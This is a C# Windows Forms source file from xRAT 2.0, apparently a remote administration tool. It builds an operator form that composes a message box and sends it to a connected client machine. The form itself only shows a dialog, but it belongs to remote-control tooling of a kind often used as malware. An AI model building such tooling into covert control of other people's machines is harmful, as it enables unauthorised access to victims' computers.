using System;
using System.Windows.Forms;
using Core;

namespace xRAT_2.Forms
{
    public partial class frmShowMessagebox : Form
    {
        private Client cClient;

        public frmShowMessagebox(Client c)
        {
            cClient = c;
            cClient.Value.frmSM = this;

            InitializeComponent();
        }

        private void frmShowMessagebox_Load(object sender, EventArgs e)
        {
            if (cClient != null)
                this.Text = string.Format("xRAT 2.0 - Show Messagebox [{0}:{1}]", cClient.EndPoint.Address.ToString(), cClient.EndPoint.Port.ToString());

            cmbMsgButtons.Items.AddRange(new string[] { "AbortRetryIgnore", "OK", "OKCancel" , "RetryCancel", "YesNo", "YesNoCancel" });
            cmbMsgButtons.SelectedIndex = 0;
            cmbMsgIcon.Items.AddRange(new string[] { "None", "Error", "Hand", "Question", "Exclamation", "Warning", "Information", "Asterisk" });
            cmbMsgIcon.SelectedIndex = 0;
        }

        private void frmShowMessagebox_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (cClient.Value != null)
                cClient.Value.frmSM = null;
        }

        private void btnTest_Click(object sender, EventArgs e)
        {
            MessageBox.Show(null, txtText.Text, txtCaption.Text, (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), getMessageBoxButton(cmbMsgButtons.SelectedIndex)), (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), getMessageBoxIcon(cmbMsgIcon.SelectedIndex)));
        }

        private void btnSend_Click(object sender, EventArgs e)
        {
            new Core.Packets.ServerPackets.ShowMessageBox(txtCaption.Text, txtText.Text, getMessageBoxButton(cmbMsgButtons.SelectedIndex), getMessageBoxIcon(cmbMsgIcon.SelectedIndex)).Execute(cClient);
            this.Close();
        }

        private string getMessageBoxButton(int selectedIndex)
        {
            switch(selectedIndex)
            {
                case 0: return "AbortRetryIgnore";
                case 1: return "OK";
                case 2: return "OKCancel";
                case 3: return "RetryCancel";
                case 4: return "YesNo";
                case 5: return "YesNoCancel";
                default: return "OK";
            }
        }

        private string getMessageBoxIcon(int selectedIndex)
        {
            switch (selectedIndex)
            {
                case 0: return "None";
                case 1: return "Error";
                case 2: return "Hand";
                case 3: return "Question";
                case 4: return "Exclamation";
                case 5: return "Warning";
                case 6: return "Information";
                case 7: return "Asterisk";
                default: return "None";
            }
        }
    }
}
